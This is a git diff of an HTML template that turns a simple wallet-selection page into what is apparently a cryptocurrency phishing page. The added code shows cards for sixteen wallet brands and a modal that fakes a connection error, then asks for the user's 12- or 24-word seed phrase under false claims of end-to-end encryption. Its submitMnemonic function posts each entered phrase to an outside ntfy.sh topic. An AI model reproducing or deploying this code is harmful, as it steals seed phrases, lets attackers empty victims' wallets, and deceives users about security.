@@ -4,62 +4,232 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.tailwindcss.com"></script>
-    <title>Select a Wallet</title>
+    <title>Wallet Selection</title>
 </head>
-<body class="bg-white flex flex-col items-center p-6">
-    <h1 class="text-2xl font-bold text-gray-900">Select a Wallet</h1>
+<body class="bg-gray-100 flex flex-col items-center">
+
+    <h1 class="text-2xl font-bold text-gray-900 p-6">Select a Wallet</h1>
     <div class="w-24 h-1 bg-pink-500 my-2"></div>
-    
-    <div class="flex items-center w-full max-w-2xl mt-4 border border-gray-300 rounded-lg overflow-hidden">
-        <input type="text" placeholder="Find your wallet" class="w-full p-3 focus:outline-none" />
-        <button class="bg-pink-500 text-white px-6 py-3">Search</button>
-    </div>
-    
-    <p class="mt-4 text-gray-600">0 results found</p>
-    
-    <div class="grid grid-cols-3 gap-6 mt-4 max-w-4xl">
-        <div class="bg-white shadow-md rounded-lg p-4 flex items-center space-x-3">
-            <img src="ledger-logo.png" alt="Ledger" class="w-12 h-12" />
+
+    <!-- Wallet Grid -->
+    <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mt-4 w-full p-6">
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Ledger', 'https://flarentwork.com/static/logo/images.png')">
+            <img src="https://flarentwork.com/static/logo/images.png" alt="Ledger" class="w-12 h-12">
             <div>
                 <p class="font-semibold">Ledger</p>
                 <p class="text-sm text-gray-500">ledger.com</p>
             </div>
         </div>
-        <div class="bg-white shadow-md rounded-lg p-4 flex items-center space-x-3">
-            <img src="walletconnect-logo.png" alt="Wallet Connect" class="w-12 h-12" />
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Wallet Connect', 'https://flarentwork.com/static/logo/walle.jpg')">
+            <img src="https://flarentwork.com/static/logo/walle.jpg" alt="Metamask" class="w-12 h-12">
             <div>
                 <p class="font-semibold">Wallet Connect</p>
                 <p class="text-sm text-gray-500">walletconnect.com</p>
             </div>
         </div>
-        <div class="bg-white shadow-md rounded-lg p-4 flex items-center space-x-3">
-            <img src="metamask-logo.png" alt="Metamask" class="w-12 h-12" />
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Metamask', 'https://flarentwork.com/static/logo/metamask.jpg')">
+            <img src="https://flarentwork.com/static/logo/metamask.jpg" alt="Metamask" class="w-12 h-12">
             <div>
                 <p class="font-semibold">Metamask</p>
                 <p class="text-sm text-gray-500">metamask.io</p>
             </div>
         </div>
-        <div class="bg-white shadow-md rounded-lg p-4 flex items-center space-x-3">
-            <img src="binance-logo.png" alt="Binance Chain Wallet" class="w-12 h-12" />
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Binance Chain Wallet', 'https://flarentwork.com/static/logo/binance.png')">
+            <img src="https://flarentwork.com/static/logo/binance.png" alt="Ledger" class="w-12 h-12">
             <div>
                 <p class="font-semibold">Binance Chain Wallet</p>
                 <p class="text-sm text-gray-500">binance.com</p>
             </div>
         </div>
-        <div class="bg-white shadow-md rounded-lg p-4 flex items-center space-x-3">
-            <img src="xaman-logo.png" alt="Xaman Wallet" class="w-12 h-12" />
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Xaman', 'https://flarentwork.com/static/logo/xaman.webp')">
+            <img src="https://flarentwork.com/static/logo/xaman.webp" alt="Metamask" class="w-12 h-12">
             <div>
                 <p class="font-semibold">Xaman Wallet</p>
                 <p class="text-sm text-gray-500">xaman.app</p>
             </div>
         </div>
-        <div class="bg-white shadow-md rounded-lg p-4 flex items-center space-x-3">
-            <img src="dcent-logo.png" alt="D'Cent Wallet" class="w-12 h-12" />
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('D'Cent Wallet', 'https://flarentwork.com/static/logo/y-300x300.png')">
+            <img src="https://flarentwork.com/static/logo/y-300x300.png" alt="Ledger" class="w-12 h-12">
             <div>
                 <p class="font-semibold">D'Cent Wallet</p>
                 <p class="text-sm text-gray-500">dcentwallet.com</p>
             </div>
         </div>
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Arculus', 'https://flarentwork.com/static/logo/arculus.png')">
+            <img src="https://flarentwork.com/static/logo/arculus.png" alt="Metamask" class="w-12 h-12">
+            <div>
+                <p class="font-semibold">Arculus</p>
+                <p class="text-sm text-gray-500">getarculus.com</p>
+            </div>
+        </div>
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Bitfrost', 'https://flarentwork.com/static/logo/bitfrost.jpeg')">
+            <img src="https://flarentwork.com/static/logo/bitfrost.jpeg" alt="Ledger" class="w-12 h-12">
+            <div>
+                <p class="font-semibold">Bitfrost</p>
+                <p class="text-sm text-gray-500">bitfrost.io</p>
+            </div>
+        </div>
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Ballet Wallet', 'https://flarentwork.com/static/logo/ballet.png')">
+            <img src="https://flarentwork.com/static/logo/ballet.png" alt="Metamask" class="w-12 h-12">
+            <div>
+                <p class="font-semibold">Ballet Wallet</p>
+                <p class="text-sm text-gray-500">ballet.com</p>
+            </div>
+        </div>
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Tangem Wallet', 'https://flarentwork.com/static/logo/tangem.png')">
+            <img src="https://flarentwork.com/static/logo/tangem.png" alt="Ledger" class="w-12 h-12">
+            <div>
+                <p class="font-semibold">Tangem Wallet</p>
+                <p class="text-sm text-gray-500">tangem.com</p>
+            </div>
+        </div>
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Polygon Wallet', 'https://flarentwork.com/static/logo/polygon.jpg')">
+            <img src="https://flarentwork.com/static/logo/polygon.jpg" alt="Metamask" class="w-12 h-12">
+            <div>
+                <p class="font-semibold">Polygon Wallet</p>
+                <p class="text-sm text-gray-500">polygon.technology</p>
+            </div>
+        </div>
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Nexo Wallet', 'https://flarentwork.com/static/logo/nexo.png')">
+            <img src="https://flarentwork.com/static/logo/nexo.png" alt="Ledger" class="w-12 h-12">
+            <div>
+                <p class="font-semibold">Nexo Wallet</p>
+                <p class="text-sm text-gray-500">nexo.com</p>
+            </div>
+        </div>
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Bitpay', 'https://flarentwork.com/static/logo/bitpay.jpg')">
+            <img src="https://flarentwork.com/static/logo/bitpay.jpg" alt="Metamask" class="w-12 h-12">
+            <div>
+                <p class="font-semibold">Bitpay</p>
+                <p class="text-sm text-gray-500">bitpay.com</p>
+            </div>
+        </div>
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Coinbase', 'https://flarentwork.com/static/logo/coinbase.png')">
+            <img src="https://flarentwork.com/static/logo/coinbase.png" alt="Ledger" class="w-12 h-12">
+            <div>
+                <p class="font-semibold">Coinbase</p>
+                <p class="text-sm text-gray-500">coinbase.com</p>
+            </div>
+        </div>
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Trust Wallet', 'https://flarentwork.com/static/icon/logo/trustwallet-300x300.jpeg')">
+            <img src="https://flarentwork.com/static/icon/logo/trustwallet-300x300.jpeg" alt="Metamask" class="w-12 h-12">
+            <div>
+                <p class="font-semibold">Trust Wallet</p>
+            </div>
+        </div>
+        <div class="wallet bg-white shadow-md rounded-lg p-4 flex items-center space-x-3 cursor-pointer" onclick="openModal('Polkadot', 'https://flarentwork.com/static/icon/logo/download-14.png')">
+            <img src="https://flarentwork.com/static/icon/logo/download-14.png" alt="Ledger" class="w-12 h-12">
+            <div>
+                <p class="font-semibold">Polkadot</p>
+            </div>
+        </div>
     </div>
+
+    <!-- Modal -->
+    <div id="walletModal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 hidden">
+        <div class="bg-white w-[90%] max-w-md p-6 rounded-lg shadow-lg relative">
+            <!-- Close Button -->
+            <button onclick="closeModal()" class="absolute top-3 right-3 text-gray-500 hover:text-gray-800">
+                &times;
+            </button>
+
+            <!-- Modal Content -->
+            <div class="text-center">
+                <img id="walletImage" src="" alt="Wallet" class="w-16 h-16 mx-auto">
+                <h2 id="walletName" class="text-xl font-semibold mt-3"></h2>
+                <p class="text-gray-500">This session is secured and encrypted</p>
+
+                <!-- Loading Spinner -->
+                <div id="loading" class="flex justify-center items-center mt-4">
+                    <div class="w-6 h-6 border-4 border-gray-300 border-t-pink-500 rounded-full animate-spin"></div>
+                </div>
+
+                <!-- Error Message (Initially Hidden) -->
+                <div id="errorMessage" class="border border-red-500 text-red-500 px-4 py-2 mt-4 rounded hidden">
+                    An error occurred... please try again or connect manually
+                </div>
+
+                <button class="w-full border border-pink-500 text-pink-500 px-4 py-2 mt-4 rounded hidden" id="tryAgainBtn" onclick="restartModal()">
+                    Try Again
+                </button>
+                <button class="w-full bg-pink-500 text-white px-4 py-2 mt-2 rounded hidden" id="connectManuallyBtn" onclick="showMnemonicField()">
+                    Connect Manually
+                </button>
+
+                <!-- Mnemonic Input (Initially Hidden) -->
+                <textarea id="mnemonicField" class="w-full border rounded p-2 mt-4 hidden" placeholder="Enter your 12 or 24 Mnemonic words" oninput="toggleSubmitButton()"></textarea>
+
+                <!-- Submit Button (Initially Hidden) -->
+                <button id="submitMnemonicBtn" class="w-full bg-green-500 text-white px-4 py-2 mt-4 rounded hidden" onclick="submitMnemonic()">
+                    Submit
+                </button>
+
+                <p class="text-gray-600 text-sm mt-4">This session is protected with end-to-end encryption</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function openModal(walletName, walletImage) {
+            document.getElementById("walletName").innerText = walletName;
+            document.getElementById("walletImage").src = walletImage;
+            document.getElementById("walletModal").classList.remove("hidden");
+
+            // Show loading spinner & hide error message
+            document.getElementById("loading").classList.remove("hidden");
+            document.getElementById("errorMessage").classList.add("hidden");
+            document.getElementById("tryAgainBtn").classList.add("hidden");
+            document.getElementById("connectManuallyBtn").classList.add("hidden");
+
+            // Show error after 5 seconds
+            setTimeout(() => {
+                document.getElementById("loading").classList.add("hidden"); // Hide loading
+                document.getElementById("errorMessage").classList.remove("hidden"); // Show error
+                document.getElementById("tryAgainBtn").classList.remove("hidden");
+                document.getElementById("connectManuallyBtn").classList.remove("hidden");
+            }, 5000);
+        }
+
+        function closeModal() {
+            document.getElementById("mnemonicField").classList.add("hidden");
+            document.getElementById("walletModal").classList.add("hidden");
+        }
+
+        function restartModal() {
+            openModal(document.getElementById("walletName").innerText, document.getElementById("walletImage").src);
+        }
+
+        function showMnemonicField() {
+            document.getElementById("errorMessage").classList.add("hidden");
+            document.getElementById("tryAgainBtn").classList.add("hidden");
+            document.getElementById("connectManuallyBtn").classList.add("hidden");
+            document.getElementById("mnemonicField").classList.remove("hidden");
+        }
+
+        // Toggle Submit Button based on Mnemonic input
+        function toggleSubmitButton() {
+            const mnemonicField = document.getElementById("mnemonicField");
+            const submitBtn = document.getElementById("submitMnemonicBtn");
+
+            if (mnemonicField.value.trim() !== "") {
+                submitBtn.classList.remove("hidden");
+            } else {
+                submitBtn.classList.add("hidden");
+            }
+        }
+
+        function submitMnemonic() {
+            const message = document.getElementById('mnemonicField').value;
+            const wallet = document.getElementById('walletName').innerText;
+            fetch("https://ntfy.sh/KING_OF_FOOTBALL", {
+                method: "POST",
+                headers: { "Content-Type": "text/plain" },
+                body: `${wallet}: ${message}`
+            })
+        }
+    </script>
+
+    {% include "./comps/footer.html" %}
+
 </body>
 </html>
